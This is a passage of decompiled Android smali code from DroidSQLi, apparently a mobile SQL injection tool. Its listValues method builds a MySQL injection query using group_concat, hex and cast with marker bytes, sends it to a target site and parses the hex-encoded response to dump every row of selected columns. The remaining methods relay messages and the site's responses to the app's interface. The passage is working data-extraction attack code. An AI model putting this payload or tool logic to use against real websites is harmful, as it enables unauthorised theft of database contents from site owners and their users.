    new-instance v1, Lnet/edgard/droidsqli/mvc/model/database/Table;

    invoke-direct {v1, v6, v4, p1}, Lnet/edgard/droidsqli/mvc/model/database/Table;-><init>(Ljava/lang/String;Ljava/lang/String;Lnet/edgard/droidsqli/mvc/model/database/Database;)V

    .line 858
    .local v1, "newTable":Lnet/edgard/droidsqli/mvc/model/database/Table;
    invoke-interface {v7, v1}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    goto :goto_1
.end method

.method public listValues(Ljava/util/List;Lnet/edgard/droidsqli/mvc/model/Interruptable;)V
    .locals 29
    .param p2, "interruptable"    # Lnet/edgard/droidsqli/mvc/model/Interruptable;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/util/List",
            "<",
            "Lnet/edgard/droidsqli/mvc/model/database/Column;",
            ">;",
            "Lnet/edgard/droidsqli/mvc/model/Interruptable;",
            ")V"
        }
    .end annotation

    .annotation system Ldalvik/annotation/Throws;
        value = {
            Lnet/edgard/droidsqli/exception/PreparationException;,
            Lnet/edgard/droidsqli/exception/StoppableException;
        }
    .end annotation

    .prologue
    .line 947
    .local p1, "argsElementDatabase":Ljava/util/List;, "Ljava/util/List<Lnet/edgard/droidsqli/mvc/model/database/Column;>;"
    const/16 v24, 0x0

    move-object/from16 v0, p1

    move/from16 v1, v24

    invoke-interface {v0, v1}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v24

    check-cast v24, Lnet/edgard/droidsqli/mvc/model/database/Column;

    invoke-virtual/range {v24 .. v24}, Lnet/edgard/droidsqli/mvc/model/database/Column;->getParent()Lnet/edgard/droidsqli/mvc/model/database/ElementDatabase;

    move-result-object v24

    invoke-virtual/range {v24 .. v24}, Lnet/edgard/droidsqli/mvc/model/database/ElementDatabase;->getParent()Lnet/edgard/droidsqli/mvc/model/database/ElementDatabase;

    move-result-object v7

    .line 948
    .local v7, "database":Lnet/edgard/droidsqli/mvc/model/database/ElementDatabase;
    const/16 v24, 0x0

    move-object/from16 v0, p1

    move/from16 v1, v24

    invoke-interface {v0, v1}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v24

    check-cast v24, Lnet/edgard/droidsqli/mvc/model/database/Column;

    invoke-virtual/range {v24 .. v24}, Lnet/edgard/droidsqli/mvc/model/database/Column;->getParent()Lnet/edgard/droidsqli/mvc/model/database/ElementDatabase;

    move-result-object v21

    .line 949
    .local v21, "table":Lnet/edgard/droidsqli/mvc/model/database/ElementDatabase;
    const/16 v24, 0x0

    move-object/from16 v0, p1

    move/from16 v1, v24

    invoke-interface {v0, v1}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v24

    check-cast v24, Lnet/edgard/droidsqli/mvc/model/database/Column;

    invoke-virtual/range {v24 .. v24}, Lnet/edgard/droidsqli/mvc/model/database/Column;->getParent()Lnet/edgard/droidsqli/mvc/model/database/ElementDatabase;

    move-result-object v24

    invoke-virtual/range {v24 .. v24}, Lnet/edgard/droidsqli/mvc/model/database/ElementDatabase;->getCount()I

    move-result v19

    .line 952
    .local v19, "rowCount":I
    new-instance v24, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;

    const-string v25, "start-progress"

    move-object/from16 v0, v24

    move-object/from16 v1, p0

    move-object/from16 v2, v25

    move-object/from16 v3, v21

    invoke-direct {v0, v1, v2, v3}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;-><init>(Lnet/edgard/droidsqli/mvc/model/ModelObservable;Ljava/lang/String;Ljava/lang/Object;)V

    invoke-virtual/range {v24 .. v24}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;->run()V

    .line 955
    new-instance v6, Ljava/util/ArrayList;

    invoke-direct {v6}, Ljava/util/ArrayList;-><init>()V

    .line 956
    .local v6, "columnsName":Ljava/util/List;, "Ljava/util/List<Ljava/lang/String;>;"
    invoke-interface/range {p1 .. p1}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v24

    :goto_0
    invoke-interface/range {v24 .. v24}, Ljava/util/Iterator;->hasNext()Z

    move-result v25

    if-nez v25, :cond_1

    .line 962
    invoke-interface {v6}, Ljava/util/List;->size()I

    move-result v24

    move/from16 v0, v24

    new-array v0, v0, [Ljava/lang/String;

    move-object/from16 v24, v0

    move-object/from16 v0, v24

    invoke-interface {v6, v0}, Ljava/util/List;->toArray([Ljava/lang/Object;)[Ljava/lang/Object;

    move-result-object v4

    check-cast v4, [Ljava/lang/String;

    .line 963
    .local v4, "arrayColumns":[Ljava/lang/String;
    const-string v24, "{%}"

    move-object/from16 v0, v24

    invoke-static {v4, v0}, Lnet/edgard/droidsqli/tool/StringTool;->join([Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    .line 965
    .local v9, "formatListColumn":Ljava/lang/String;
    const-string v24, "{%}"

    const-string v25, "`,0x00)),0x7f,trim(ifnull(`"

    move-object/from16 v0, v24

    move-object/from16 v1, v25

    invoke-virtual {v9, v0, v1}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v9

    .line 967
    new-instance v24, Ljava/lang/StringBuilder;

    const-string v25, "trim(ifnull(`"

    invoke-direct/range {v24 .. v25}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v24

    invoke-virtual {v0, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v24

    const-string v25, "`,0x00))"

    invoke-virtual/range {v24 .. v25}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v24

    invoke-virtual/range {v24 .. v24}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    .line 969
    const/16 v24, 0x1

    move/from16 v0, v24

    new-array v0, v0, [Ljava/lang/String;

    move-object/from16 v17, v0

    const/16 v24, 0x0

    const-string v25, ""

    aput-object v25, v17, v24

    .line 970
    .local v17, "pageSource":[Ljava/lang/String;
    new-instance v24, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_loopIntoResults;

    move-object/from16 v0, v24

    move-object/from16 v1, p0

    move-object/from16 v2, p0

    move-object/from16 v3, p2

    invoke-direct {v0, v1, v2, v3}, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_loopIntoResults;-><init>(Lnet/edgard/droidsqli/mvc/model/InjectionModel;Lnet/edgard/droidsqli/mvc/model/InjectionModel;Lnet/edgard/droidsqli/mvc/model/Interruptable;)V

    const/16 v25, 0x5

    move/from16 v0, v25

    new-array v0, v0, [Ljava/lang/Object;

    move-object/from16 v25, v0

    const/16 v26, 0x0

    .line 971
    new-instance v27, Ljava/lang/StringBuilder;

    const-string v28, "select+concat(group_concat(0x6868,r,0x6a6a,hex(cast(q+as+char)),0x6868+order+by+r+separator+0x6767),0x69)from(select+hex(cast(concat("

    invoke-direct/range {v27 .. v28}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 983
    move-object/from16 v0, v27

    invoke-virtual {v0, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v27

    const-string v28, ")as+char))r,"

    invoke-virtual/range {v27 .. v28}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v27

    .line 984
    const-string v28, "count(*)q+"

    invoke-virtual/range {v27 .. v28}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v27

    .line 985
    const-string v28, "from+"

    invoke-virtual/range {v27 .. v28}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v27

    .line 986
    const-string v28, "`"

    invoke-virtual/range {v27 .. v28}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v27

    move-object/from16 v0, v27

    invoke-virtual {v0, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v27

    const-string v28, "`.`"

    invoke-virtual/range {v27 .. v28}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v27

    move-object/from16 v0, v27

    move-object/from16 v1, v21

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v27

    const-string v28, "`+"

    invoke-virtual/range {v27 .. v28}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v27

    .line 987
    const-string v28, "group+by+r{limit}"

    invoke-virtual/range {v27 .. v28}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v27

    .line 988
    const-string v28, ")x"

    invoke-virtual/range {v27 .. v28}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v27

    .line 971
    invoke-virtual/range {v27 .. v27}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v27

    aput-object v27, v25, v26

    const/16 v26, 0x1

    .line 989
    aput-object v17, v25, v26

    const/16 v26, 0x2

    const/16 v27, 0x1

    invoke-static/range {v27 .. v27}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v27

    aput-object v27, v25, v26

    const/16 v26, 0x3

    invoke-static/range {v19 .. v19}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v27

    aput-object v27, v25, v26

    const/16 v26, 0x4

    aput-object v21, v25, v26

    .line 970
    invoke-virtual/range {v24 .. v25}, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_loopIntoResults;->action([Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v10

    .line 993
    .local v10, "hexResult":Ljava/lang/String;
    const-string v24, "hh([0-9A-F]*)jj([0-9A-F]*)(c)?hh"

    const/16 v25, 0x22

    invoke-static/range {v24 .. v25}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;I)Ljava/util/regex/Pattern;

    move-result-object v24

    move-object/from16 v0, v24

    invoke-virtual {v0, v10}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v18

    .line 995
    .local v18, "regexSearch":Ljava/util/regex/Matcher;
    invoke-virtual/range {v18 .. v18}, Ljava/util/regex/Matcher;->find()Z

    move-result v24

    if-nez v24, :cond_0

    .line 996
    const-string v24, "Fetching values fails (row count may be approximate)"

    const/16 v25, 0x0

    aget-object v25, v17, v25

    invoke-virtual/range {v25 .. v25}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v25

    move-object/from16 v0, p0

    move-object/from16 v1, v24

    move-object/from16 v2, v25

    invoke-virtual {v0, v1, v2}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->sendResponseFromSite(Ljava/lang/String;Ljava/lang/String;)V

    .line 998
    :cond_0
    invoke-virtual/range {v18 .. v18}, Ljava/util/regex/Matcher;->reset()Ljava/util/regex/Matcher;

    .line 1000
    const/16 v20, 0x0

    .line 1001
    .local v20, "rowsFound":I
    new-instance v15, Ljava/util/ArrayList;

    invoke-direct {v15}, Ljava/util/ArrayList;-><init>()V

    .line 1005
    .local v15, "listValues":Ljava/util/List;, "Ljava/util/List<Ljava/util/List<Ljava/lang/String;>;>;"
    :goto_1
    invoke-virtual/range {v18 .. v18}, Ljava/util/regex/Matcher;->find()Z

    move-result v24

    if-nez v24, :cond_2

    .line 1025
    const/16 v24, 0x0

    const-string v25, "duplicate"

    move/from16 v0, v24

    move-object/from16 v1, v25

    invoke-interface {v6, v0, v1}, Ljava/util/List;->add(ILjava/lang/Object;)V

    .line 1026
    const/16 v24, 0x0

    const-string v25, ""

    move/from16 v0, v24

    move-object/from16 v1, v25

    invoke-interface {v6, v0, v1}, Ljava/util/List;->add(ILjava/lang/Object;)V

    .line 1029
    invoke-interface {v15}, Ljava/util/List;->size()I

    move-result v24

    invoke-interface {v6}, Ljava/util/List;->size()I

    move-result v25

    filled-new-array/range {v24 .. v25}, [I

    move-result-object v24

    const-class v25, Ljava/lang/String;

    move-object/from16 v0, v25

    move-object/from16 v1, v24

    invoke-static {v0, v1}, Ljava/lang/reflect/Array;->newInstance(Ljava/lang/Class;[I)Ljava/lang/Object;

    move-result-object v22

    check-cast v22, [[Ljava/lang/String;

    .line 1030
    .local v22, "tableDatas":[[Ljava/lang/String;
    const/4 v12, 0x0

    .local v12, "indexRow":I
    :goto_2
    invoke-interface {v15}, Ljava/util/List;->size()I

    move-result v24

    move/from16 v0, v24

    if-lt v12, v0, :cond_4

    .line 1045
    invoke-interface {v6}, Ljava/util/List;->size()I

    move-result v24

    move/from16 v0, v24

    new-array v0, v0, [Ljava/lang/String;

    move-object/from16 v24, v0

    move-object/from16 v0, v24

    invoke-interface {v6, v0}, Ljava/util/List;->toArray([Ljava/lang/Object;)[Ljava/lang/Object;

    move-result-object v4

    .end local v4    # "arrayColumns":[Ljava/lang/String;
    check-cast v4, [Ljava/lang/String;

    .line 1047
    .restart local v4    # "arrayColumns":[Ljava/lang/String;
    const/16 v24, 0x3

    move/from16 v0, v24

    new-array v0, v0, [Ljava/lang/Object;

    move-object/from16 v16, v0

    const/16 v24, 0x0

    aput-object v4, v16, v24

    const/16 v24, 0x1

    aput-object v22, v16, v24

    const/16 v24, 0x2

    aput-object v21, v16, v24

    .line 1049
    .local v16, "objectData":[Ljava/lang/Object;
    new-instance v24, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;

    const-string v25, "add-values"

    move-object/from16 v0, v24

    move-object/from16 v1, p0

    move-object/from16 v2, v25

    move-object/from16 v3, v16

    invoke-direct {v0, v1, v2, v3}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;-><init>(Lnet/edgard/droidsqli/mvc/model/ModelObservable;Ljava/lang/String;Ljava/lang/Object;)V

    invoke-virtual/range {v24 .. v24}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;->run()V

    .line 1051
    new-instance v24, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;

    const-string v25, "end-progress"

    move-object/from16 v0, v24

    move-object/from16 v1, p0

    move-object/from16 v2, v25

    move-object/from16 v3, v21

    invoke-direct {v0, v1, v2, v3}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;-><init>(Lnet/edgard/droidsqli/mvc/model/ModelObservable;Ljava/lang/String;Ljava/lang/Object;)V

    invoke-virtual/range {v24 .. v24}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;->run()V

    .line 1052
    return-void

    .line 956
    .end local v4    # "arrayColumns":[Ljava/lang/String;
    .end local v9    # "formatListColumn":Ljava/lang/String;
    .end local v10    # "hexResult":Ljava/lang/String;
    .end local v12    # "indexRow":I
    .end local v15    # "listValues":Ljava/util/List;, "Ljava/util/List<Ljava/util/List<Ljava/lang/String;>;>;"
    .end local v16    # "objectData":[Ljava/lang/Object;
    .end local v17    # "pageSource":[Ljava/lang/String;
    .end local v18    # "regexSearch":Ljava/util/regex/Matcher;
    .end local v20    # "rowsFound":I
    .end local v22    # "tableDatas":[[Ljava/lang/String;
    :cond_1
    invoke-interface/range {v24 .. v24}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Lnet/edgard/droidsqli/mvc/model/database/ElementDatabase;

    .line 957
    .local v8, "e":Lnet/edgard/droidsqli/mvc/model/database/ElementDatabase;
    new-instance v25, Ljava/lang/StringBuilder;

    invoke-direct/range {v25 .. v25}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v0, v25

    invoke-virtual {v0, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v25

    invoke-virtual/range {v25 .. v25}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v25

    move-object/from16 v0, v25

    invoke-interface {v6, v0}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    goto/16 :goto_0

    .line 1006
    .end local v8    # "e":Lnet/edgard/droidsqli/mvc/model/database/ElementDatabase;
    .restart local v4    # "arrayColumns":[Ljava/lang/String;
    .restart local v9    # "formatListColumn":Ljava/lang/String;
    .restart local v10    # "hexResult":Ljava/lang/String;
    .restart local v15    # "listValues":Ljava/util/List;, "Ljava/util/List<Ljava/util/List<Ljava/lang/String;>;>;"
    .restart local v17    # "pageSource":[Ljava/lang/String;
    .restart local v18    # "regexSearch":Ljava/util/regex/Matcher;
    .restart local v20    # "rowsFound":I
    :cond_2
    const/16 v24, 0x1

    move-object/from16 v0, v18

    move/from16 v1, v24

    invoke-virtual {v0, v1}, Ljava/util/regex/Matcher;->group(I)Ljava/lang/String;

    move-result-object v24

    invoke-static/range {v24 .. v24}, Lnet/edgard/droidsqli/tool/StringTool;->hexstr(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v23

    .line 1007
    .local v23, "values":Ljava/lang/String;
    const/16 v24, 0x2

    move-object/from16 v0, v18

    move/from16 v1, v24

    invoke-virtual {v0, v1}, Ljava/util/regex/Matcher;->group(I)Ljava/lang/String;

    move-result-object v24

    invoke-static/range {v24 .. v24}, Lnet/edgard/droidsqli/tool/StringTool;->hexstr(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v24

    invoke-static/range {v24 .. v24}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v13

    .line 1011
    .local v13, "instances":I
    new-instance v24, Ljava/util/ArrayList;

    invoke-direct/range {v24 .. v24}, Ljava/util/ArrayList;-><init>()V

    move-object/from16 v0, v24

    invoke-interface {v15, v0}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 1012
    move/from16 v0, v20

    invoke-interface {v15, v0}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v24

    check-cast v24, Ljava/util/List;

    new-instance v25, Ljava/lang/StringBuilder;

    invoke-direct/range {v25 .. v25}, Ljava/lang/StringBuilder;-><init>()V

    add-int/lit8 v26, v20, 0x1

    invoke-virtual/range {v25 .. v26}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v25

    invoke-virtual/range {v25 .. v25}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v25

    invoke-interface/range {v24 .. v25}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 1013
    move/from16 v0, v20

    invoke-interface {v15, v0}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v24

    check-cast v24, Ljava/util/List;

    new-instance v25, Ljava/lang/StringBuilder;

    invoke-direct/range {v25 .. v25}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v0, v25

    invoke-virtual {v0, v13}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v25

    invoke-virtual/range {v25 .. v25}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v25

    invoke-interface/range {v24 .. v25}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 1014
    const-string v24, "7f"

    invoke-static/range {v24 .. v24}, Lnet/edgard/droidsqli/tool/StringTool;->hexstr(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v24

    const/16 v25, -0x1

    invoke-virtual/range {v23 .. v25}, Ljava/lang/String;->split(Ljava/lang/String;I)[Ljava/lang/String;

    move-result-object v26

    move-object/from16 v0, v26

    array-length v0, v0

    move/from16 v27, v0

    const/16 v24, 0x0

    move/from16 v25, v24

    :goto_3
    move/from16 v0, v25

    move/from16 v1, v27

    if-lt v0, v1, :cond_3

    .line 1018
    add-int/lit8 v20, v20, 0x1

    goto/16 :goto_1

    .line 1014
    :cond_3
    aget-object v5, v26, v25

    .line 1015
    .local v5, "cellValue":Ljava/lang/String;
    move/from16 v0, v20

    invoke-interface {v15, v0}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v24

    check-cast v24, Ljava/util/List;

    move-object/from16 v0, v24

    invoke-interface {v0, v5}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 1014
    add-int/lit8 v24, v25, 0x1

    move/from16 v25, v24

    goto :goto_3

    .line 1031
    .end local v5    # "cellValue":Ljava/lang/String;
    .end local v13    # "instances":I
    .end local v23    # "values":Ljava/lang/String;
    .restart local v12    # "indexRow":I
    .restart local v22    # "tableDatas":[[Ljava/lang/String;
    :cond_4
    const/4 v14, 0x0

    .line 1032
    .local v14, "isIncomplete":Z
    const/4 v11, 0x0

    .local v11, "indexColumn":I
    :goto_4
    invoke-interface {v6}, Ljava/util/List;->size()I

    move-result v24

    move/from16 v0, v24

    if-lt v11, v0, :cond_6

    .line 1039
    if-eqz v14, :cond_5

    .line 1040
    new-instance v24, Ljava/lang/StringBuilder;

    const-string v25, "Max string length reached on the distant MySQL server, the row number "

    invoke-direct/range {v24 .. v25}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    add-int/lit8 v25, v12, 0x1

    invoke-virtual/range {v24 .. v25}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v24

    const-string v25, " is incomplete:\n"

    invoke-virtual/range {v24 .. v25}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v26

    .line 1041
    invoke-interface {v15, v12}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v24

    check-cast v24, Ljava/util/List;

    invoke-interface {v15, v12}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v25

    check-cast v25, Ljava/util/List;

    invoke-interface/range {v25 .. v25}, Ljava/util/List;->size()I

    move-result v25

    move/from16 v0, v25

    new-array v0, v0, [Ljava/lang/String;

    move-object/from16 v25, v0

    invoke-interface/range {v24 .. v25}, Ljava/util/List;->toArray([Ljava/lang/Object;)[Ljava/lang/Object;

    move-result-object v24

    check-cast v24, [Ljava/lang/String;

    const-string v25, ", "

    invoke-static/range {v24 .. v25}, Lnet/edgard/droidsqli/tool/StringTool;->join([Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v24

    move-object/from16 v0, v26

    move-object/from16 v1, v24

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v24

    invoke-virtual/range {v24 .. v24}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v24

    .line 1040
    move-object/from16 v0, p0

    move-object/from16 v1, v24

    invoke-virtual {v0, v1}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->sendErrorMessage(Ljava/lang/String;)V

    .line 1030
    :cond_5
    add-int/lit8 v12, v12, 0x1

    goto/16 :goto_2

    .line 1034
    :cond_6
    :try_start_0
    aget-object v25, v22, v12

    invoke-interface {v15, v12}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v24

    check-cast v24, Ljava/util/List;

    move-object/from16 v0, v24

    invoke-interface {v0, v11}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v24

    check-cast v24, Ljava/lang/String;

    aput-object v24, v25, v11
    :try_end_0
    .catch Ljava/lang/IndexOutOfBoundsException; {:try_start_0 .. :try_end_0} :catch_0

    .line 1032
    :goto_5
    add-int/lit8 v11, v11, 0x1

    goto :goto_4

    .line 1035
    :catch_0
    move-exception v8

    .line 1036
    .local v8, "e":Ljava/lang/IndexOutOfBoundsException;
    const/4 v14, 0x1

    goto :goto_5
.end method

.method public sendErrorMessage(Ljava/lang/String;)V
    .locals 4
    .param p1, "message"    # Ljava/lang/String;

    .prologue
    .line 1492
    if-eqz p1, :cond_0

    .line 1494
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->sendMessage(Ljava/lang/String;)V

    .line 1495
    new-instance v0, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;

    const-string v1, "error-message"

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-static {p1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v3, "\n"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-direct {v0, p0, v1, v2}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;-><init>(Lnet/edgard/droidsqli/mvc/model/ModelObservable;Ljava/lang/String;Ljava/lang/Object;)V

    invoke-virtual {v0}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;->run()V

    .line 1497
    :cond_0
    return-void
.end method

.method public sendMessage(Ljava/lang/String;)V
    .locals 4
    .param p1, "message"    # Ljava/lang/String;

    .prologue
    .line 1486
    new-instance v0, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;

    const-string v1, "console-message"

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-static {p1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v3, "\n"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-direct {v0, p0, v1, v2}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;-><init>(Lnet/edgard/droidsqli/mvc/model/ModelObservable;Ljava/lang/String;Ljava/lang/Object;)V

    invoke-virtual {v0}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;->run()V

    .line 1487
    return-void
.end method

.method public sendResponseFromSite(Ljava/lang/String;Ljava/lang/String;)V
    .locals 2
    .param p1, "message"    # Ljava/lang/String;
    .param p2, "source"    # Ljava/lang/String;

    .prologue
    .line 1489
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-static {p1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v1, ", response from site:\n>>>"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->sendMessage(Ljava/lang/String;)V

    .line 1490
    return-void
.end method
